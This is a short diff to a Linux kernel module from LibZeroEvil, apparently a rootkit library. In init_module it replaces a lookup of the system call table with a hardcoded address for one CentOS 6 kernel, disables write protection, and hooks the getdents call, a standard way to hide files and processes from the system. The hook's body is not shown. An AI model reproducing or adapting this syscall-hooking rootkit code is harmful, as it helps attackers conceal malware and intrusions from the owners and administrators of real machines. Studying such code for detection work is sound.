@@ -1,8 +1,7 @@
 // Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>
 //
 // This file is part of LibZeroEvil.
-//
-// LibZeroEvil is free software:
+// // LibZeroEvil is free software:
 // you can redistribute it and/or modify it
 // under the terms of the GNU General Public License
 // as published by the Free Software Foundation,
@@ -59,7 +58,9 @@ init_module(void)
     fm_alert("%s\n", "Greetings the World!");
 
     /* No consideration on failure. */
-    sct = get_sct();
+    //sct = get_sct();
+    // >>> grep sys_call_table System.map-2.6.32-642.15.1.el6.x86_64
+    sct = (unsigned long **)0xffffffff816005e0;
 
     disable_wp();
     HOOK_SCT(sct, getdents);
